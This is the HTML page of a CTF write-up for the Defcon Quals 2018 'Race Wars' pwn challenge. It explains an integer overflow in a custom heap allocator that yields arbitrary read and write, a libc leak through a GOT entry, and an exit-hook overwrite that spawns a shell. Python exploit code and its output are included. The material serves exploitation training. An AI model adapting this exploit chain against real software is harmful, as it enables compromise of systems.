@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Defcon Quals 2018 - Race Wars | kileak</title>
+
+
+
+
+
+<meta name="description" content="Defcon Quals 2018 - Race Wars">
+
+
+<meta name="keywords" content="defcon">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/defconquals18-racewars/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Defcon Quals 2018 - Race Wars</h1>
+      <p class="post-meta">May 14, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Defcon Quals 2018 - Race Wars
+<!--break--></p>
+
+  <p>If you can’t get RIP on this challenge, you don’t belong near a computer.</p>
+
+  <p>2f76febe.quals2018.oooverflow.io:31337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/racewars/racewars">racewars</a> <a href="https://kileak.github.io/assets/racewars/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/racewars/libc-2.23.so">libc-2.23.so</a> <a href="https://kileak.github.io/assets/racewars/pow.py">pow.py</a></p>
+
+  <p>Team: Samurai</p>
+
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">I gotta get you racing again
+so I can make some money off your ass.
+There's a show down in the desert
+called Race Wars.
+
+I owe you a 10-second car.
+And what this is about,
+this is about Race Wars.
+
+time to select your car.
+pick:
+	(1) tires
+	(2) chassis
+	(3) engine
+	(4) transmission
+ CHOICE: 
+
+...
+
+modify your car
+pick:
+	(1) tires
+	(2) chassis
+	(3) engine
+	(4) transmission
+	(5) buy new part
+	(6) RACE!
+CHOICE: </code></pre></figure>
+
+<p>Racewars lets us build a car (truth is, we don’t have really many options on doing that ;-)), modify it, and race (which we will always lose).</p>
+
+<p>For storing the information of our current car, the binary is using some kind of “custom allocator”. It will allocate <code class="language-plaintext highlighter-rouge">0x2000</code> bytes on the heap and put a metadata object at the start of it.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">CustomHeapMetadata</span> <span class="p">{</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">Top</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">BufferEnd</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">NextHeap</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">Unknown</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="n">Size</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">BufferStart</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">Unknown2</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">Remainder</span><span class="p">;</span>
+	<span class="n">ExitFunc</span> <span class="o">*</span><span class="n">ExitHook</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">Unknown3</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">ExitFunc</span> <span class="p">{</span>
+	<span class="kt">void</span><span class="o">*</span> <span class="n">Function</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Args</span><span class="p">;</span>
+	<span class="n">ExitFunc</span><span class="o">*</span> <span class="n">Next</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Directly after this, a chunk for the parts of our car will be placed</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Car</span> <span class="p">{</span>
+	<span class="n">Chassis</span><span class="o">*</span> <span class="n">Chassis</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Tire1</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Tire2</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Tire3</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Tire4</span><span class="p">;</span>
+	<span class="n">Transmission</span><span class="o">*</span> <span class="n">Transmission</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">Engine</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>For every part we buy, it will reserve space in this <code class="language-plaintext highlighter-rouge">0x2000</code> bytes chunk (directly behind the last object), put the part there and increase the <code class="language-plaintext highlighter-rouge">Top</code> pointer accordingly, so it will always point to the next free place in the custom heap.</p>
+
+<p>If we add up more parts than fitting in this <code class="language-plaintext highlighter-rouge">0x2000</code> chunk, it will <code class="language-plaintext highlighter-rouge">alloc</code> additional space on the heap, and put according pointers into the custom heap masterdata. But since this is not needed for exploiting this binary, we won’t bother with this functionality.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Chassis</span> <span class="p">{</span>
+	<span class="kt">long</span> <span class="n">ChassisType</span><span class="p">;</span>
+	<span class="n">Chassis</span> <span class="o">*</span><span class="n">ChassisPointer</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">Name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>	
+<span class="p">}</span>
+
+<span class="k">struct</span> <span class="n">Transmission</span> <span class="p">{</span>
+	<span class="kt">long</span> <span class="n">GearCount</span><span class="p">;</span>
+	<span class="n">byte</span> <span class="n">Manual</span><span class="p">;</span>
+	<span class="n">byte</span> <span class="n">Gears</span><span class="p">[];</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x604000:	0x0000000000000000	0x0000000000002011
+0x604010:	0x0000000000604160	0x0000000000606010  &lt;= Custom heap metadata
+0x604020:	0x0000000000000000	0x0000000000000000
+0x604030:	0x0000000000000fff	0x0000000000604010
+0x604040:	0x0000000000000000	0x0000000000000000
+0x604050:	0x0000000000000000	0x0000000000000000
+0x604060:	0x0000000000604118	0x0000000000604098  &lt;= Car
+0x604070:	0x0000000000604098	0x0000000000604098
+0x604080:	0x0000000000604098	0x0000000000604148
+0x604090:	0x0000000000604130	0x0052000f00410000  &lt;= Tire
+0x6040a0:	0x000000000050ffff	0x0000000000000000
+0x6040b0:	0x0000000000000000	0x0000000000000000
+0x6040c0:	0x0000000000000000	0x0000000000000000
+0x6040d0:	0x0000000000000000	0x0000000000000000
+0x6040e0:	0x0000000000000000	0x0000000000000000
+0x6040f0:	0x0000000000000000	0x0000000000000000
+0x604100:	0x0000000000000000	0x0000000000000000
+0x604110:	0x0000000000000000	0x0000000000000501  &lt;= Chassis
+0x604120:	0x0000000000604118	0x000000617474656a
+0x604130:	0x0000000000730204	0x0000000000401f26  &lt;= Engine
+0x604140:	0x0000000000000000	0x0000000000000005  &lt;= Transmission
+0x604150:	0x0000010203040501	0x0000000000000000</code></pre></figure>
+
+<p>When we have completed the car by buying tires, chassis, engine and transmission we get a new menu, in which we can modify the parts or buy new parts. Buying new parts, will reserve new space in the chunk but not free the existing one, they will just get added to the heap.</p>
+
+<p>We can also do the race, but we’ll definitely lose it.</p>
+
+<p>Though after the race is lost, the custom heap will get cleaned up:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">cleanup_heap</span><span class="p">(</span><span class="n">CustomHeapMetadata</span> <span class="o">*</span><span class="n">heap</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="k">for</span> <span class="p">(</span> <span class="n">exit_func</span> <span class="o">=</span> <span class="n">heap</span><span class="o">-&gt;</span><span class="n">exit_funcs</span><span class="p">;</span> <span class="n">exit_func</span><span class="p">;</span> <span class="n">exit_func</span> <span class="o">=</span> <span class="p">(</span><span class="n">ExitFunc</span> <span class="o">*</span><span class="p">)</span><span class="n">exit_func</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">exit_func</span><span class="o">-&gt;</span><span class="n">Function</span> <span class="p">)</span>
+      <span class="n">exit_func</span><span class="o">-&gt;</span><span class="n">Function</span><span class="p">(</span><span class="n">exit_func</span><span class="o">-&gt;</span><span class="n">Args</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Just freeing the allocated heap chunks</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Sooo, it will loop through the list of exit functions (or free hooks, whatever ;-)) and call them before freeing the heap chunks. Those functions aren’t set anywhere in the binary itself, but if we’d be able to overwrite them, we could easily call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+
+<p>But, how to get there? All components are just added to the heap, and free is never called, so some kind of UAF doesn’t seem to be achievable for now.</p>
+
+<p>Let’s see, how we can modify values on the heap at all</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">modify_transmission</span><span class="p">(</span><span class="n">Transmission</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"ok, you have a transmission with %zu gears</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">GearCount</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"which gear to modify? "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%zu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gear_index</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">GearCount</span> <span class="o">&gt;</span> <span class="o">--</span><span class="n">gear_index</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"gear ratio for gear %zu is %zu, modify to what?: "</span><span class="p">,</span> <span class="n">gear_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">a1</span><span class="o">-&gt;</span><span class="n">Gears</span><span class="p">[</span><span class="n">gear_index</span><span class="p">]);</span>
+    
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%zu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_value</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"set gear to %d</span><span class="se">\n</span><span class="s">? (1 = yes, 0 = no)"</span><span class="p">,</span> <span class="n">new_value</span><span class="p">);</span>
+
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%zu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="p">)</span>
+      <span class="n">a1</span><span class="o">-&gt;</span><span class="n">Gears</span><span class="p">[</span><span class="n">gear_index</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_value</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>We can specify the gear (offset) and a new byte value to be written there (we can also use this to see the current byte value at that offset). But the only available transmissions have a gear count of <code class="language-plaintext highlighter-rouge">4</code> and <code class="language-plaintext highlighter-rouge">5</code>. Not much to work with, except we would be able to increase the gear count of our transmission.</p>
+
+<p>Modifying the tires work in a similar way. We can choose to modify <code class="language-plaintext highlighter-rouge">aspect ratio</code>, <code class="language-plaintext highlighter-rouge">width</code>, <code class="language-plaintext highlighter-rouge">diameter</code> and <code class="language-plaintext highlighter-rouge">construction</code> which will be stored as <code class="language-plaintext highlighter-rouge">int16</code> on the corresponding offset.</p>
+
+<p>If we could get the binary to allocate a tire “over” a transmission, we can use the tire modification to change the <code class="language-plaintext highlighter-rouge">gear count</code> for our transmission (preferable upgrade it to <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code>). This would enable us using <code class="language-plaintext highlighter-rouge">modify_transmission</code> for an arbitrary read and write.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">select_tire</span><span class="p">(</span><span class="n">CustomHeapMetadata</span><span class="o">*</span> <span class="n">heap</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">out_count</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="p">...</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"how many pairs of tires do you need?"</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"you need at least 4 tires to drive..."</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kt">int</span> <span class="n">alloc_space</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
+  <span class="n">int16</span><span class="o">*</span> <span class="n">tire</span> <span class="o">=</span> <span class="n">alloc_space_in_car</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">alloc_space</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">tire</span> <span class="p">)</span>
+    <span class="o">*</span><span class="n">out_count</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
+
+  <span class="n">tire</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
+  <span class="n">tire</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x52</span><span class="p">;</span>
+  <span class="n">tire</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xF</span><span class="p">;</span>
+  <span class="n">tire</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x50</span>
+  <span class="n">tire</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"all you can afford is some basic tire..."</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"but they'll do!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+  <span class="p">...</span>
+
+  <span class="k">return</span> <span class="n">tire</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This allocates 32 bytes per tire pair on our custom heap and stores the default settings for them there. But you see? The size for allocation gets stored into an <code class="language-plaintext highlighter-rouge">int</code> value. Looks like an integer overflow.</p>
+
+<p>If you buy <code class="language-plaintext highlighter-rouge">0x8000000</code> pairs, it will pass the first check. But multiplying it with <code class="language-plaintext highlighter-rouge">32</code> results in <code class="language-plaintext highlighter-rouge">0x1900000000</code> overflowing the value, so <code class="language-plaintext highlighter-rouge">alloc_space</code> is <code class="language-plaintext highlighter-rouge">0</code>. This will return an address on our custom heap but not increase the current <code class="language-plaintext highlighter-rouge">Top</code> pointer. Thus, it will set the tire pointers to this address, and any object which we allocate afterwards, will be put into the same address.</p>
+
+<p>Just what we needed to overlap a tire and a transmission object :)</p>
+
+<p>So let’s sum this up:</p>
+
+<ul>
+  <li>Buy <code class="language-plaintext highlighter-rouge">0x8000000</code> tire pairs, which will set the tire pointer, but not move <code class="language-plaintext highlighter-rouge">Top</code> pointer</li>
+  <li>Buy transmission, ending up inside of our tire object</li>
+  <li>Modify tires to increase gear count to <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code></li>
+  <li>Use transmission modification to leak and write to arbitrary addresses</li>
+  <li>Use negative gear offset to read heap pointer from custom heap metadata</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">solve_pow</span><span class="p">()</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CHOICE: "</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Buy 0 tires (Sets tire address, but not increase custom top pointer)"</span><span class="p">)</span>
+
+  <span class="n">buy_tires</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create transmission (inside tire object)"</span><span class="p">)</span>
+
+  <span class="n">buy_transmission</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Complete car"</span><span class="p">)</span>
+
+  <span class="n">buy_chassis</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  <span class="n">buy_engine</span><span class="p">()</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Upgrade tires to set transmission gear count to max for arbitrary read/write"</span><span class="p">)</span>
+  
+  <span class="n">upgrade_tires</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">)</span>
+  <span class="n">upgrade_tires</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">)</span>
+  <span class="n">upgrade_tires</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">)</span>
+  <span class="n">upgrade_tires</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak heap address with negative offset"</span><span class="p">)</span>
+  
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="o">-</span><span class="mh">0x90</span><span class="p">)</span>
+  <span class="n">HEAP</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0xe0</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP              : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAP</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Buy 0 tires (Sets tire address, but not increase custom top pointer)
+[*] Buy tires         : 0x8000000
+[*] Create transmission (inside tire object)
+[*] Buy transmission  : 1
+[*] Complete car
+[*] Buy chassis       : 1
+[*] Buy engine
+[*] Upgrade tires to set transmission gear count to max for arbitrary read/write
+[*] Upgrade tires     : 1 =&gt; 0xffff
+[*] Upgrade tires     : 2 =&gt; 0xffff
+[*] Upgrade tires     : 3 =&gt; 0xffff
+[*] Upgrade tires     : 4 =&gt; 0xffff
+[*] Leak heap address with negative offset
+[*] HEAP              : 0x604000</code></pre></figure>
+
+<p>So, now that we know, where the heap starts, we can calculate the needed gear offset to read a <code class="language-plaintext highlighter-rouge">got</code> entry from <code class="language-plaintext highlighter-rouge">bss</code> to leak a libc address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak got address"</span><span class="p">)</span>
+  
+<span class="n">PUTS</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0xa0</span> <span class="o">-</span> <span class="mh">0x603020</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PUTS</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+  
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PUTS              : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>  
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC              : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Leak got address
+[*] PUTS              : 0x7ffff7a7c690
+[*] LIBC              : 0x7ffff7a0d000</code></pre></figure>
+
+<p>Since we now know <code class="language-plaintext highlighter-rouge">libc</code> addresses, we can create an <code class="language-plaintext highlighter-rouge">ExitFunc</code> chunk on the heap containing a call to <code class="language-plaintext highlighter-rouge">system</code> and a pointer to <code class="language-plaintext highlighter-rouge">/bin/sh</code> as argument.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write free functions to heap (func + args)"</span><span class="p">)</span>
+
+<span class="n">write_value</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x300</span> <span class="o">-</span> <span class="mh">0xa0</span> <span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+<span class="n">write_value</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x308</span> <span class="o">-</span> <span class="mh">0xa0</span> <span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)))</span></code></pre></figure>
+
+<p>Next, we just have to overwrite the <code class="language-plaintext highlighter-rouge">ExitHook</code> pointer in our custom heap metadata pointing to this chunk.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite free function pointer in car"</span><span class="p">)</span>
+  
+<span class="n">write_value</span><span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x50</span> <span class="o">-</span> <span class="mh">0xa0</span> <span class="p">,</span> <span class="n">HEAP</span><span class="o">+</span><span class="mh">0x300</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, everything’s prepared for the race.</p>
+
+<p>We’ll lose it and the cleanup method will find our <code class="language-plaintext highlighter-rouge">ExitHook</code> pointer and call it, resulting in triggering <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Race to trigger system('/bin/sh')"</span><span class="p">)</span>
+  
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/dc18/racewars/racewars'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/dc18/racewars/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 2f76febe.quals2018.oooverflow.io on port 31337: Done
+[+] Starting local process './pow.py': pid 1832
+[*] Stopped process './pow.py' (pid 1832)
+[*] Buy 0 tires (Sets tire address, but not increase custom top pointer)
+[*] Buy tires         : 0x8000000
+[*] Create transmission (inside tire object)
+[*] Buy transmission  : 1
+[*] Complete car
+[*] Buy chassis       : 1
+[*] Buy engine
+[*] Upgrade tires to set transmission gear count to max for arbitrary read/write
+[*] Upgrade tires     : 1 =&gt; 0xffff
+[*] Upgrade tires     : 2 =&gt; 0xffff
+[*] Upgrade tires     : 3 =&gt; 0xffff
+[*] Upgrade tires     : 4 =&gt; 0xffff
+[*] Leak heap address with negative offset
+[*] HEAP              : 0xc5a000
+[*] Leak got address
+[*] PUTS              : 0x7fc8d0427690
+[*] LIBC              : 0x7fc8d03b8000
+[*] Write free functions to heap (func + args)
+[*] Write to 0xc5a260 : 0x7fc8d03fd390
+[*] Write to 0xc5a268 : 0x7fc8d0544d57
+[*] Overwrite free function pointer in car
+[*] Write to 0xc59fb0 : 0xc5a300
+[*] Race to trigger system('/bin/sh')
+[*] Switching to interactive mode
+choice 6
+johnny tran smoked you in his s2k...
+$ cat flag
+OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Defcon Quals 2018 - Race Wars&amp;url=https://kileak.github.io/ctf/2018/defconquals18-racewars/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/defconquals18-racewars/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/defconquals18-racewars';
+        var disqus_title = 'Defcon Quals 2018 - Race Wars';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/defconquals18-racewars';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
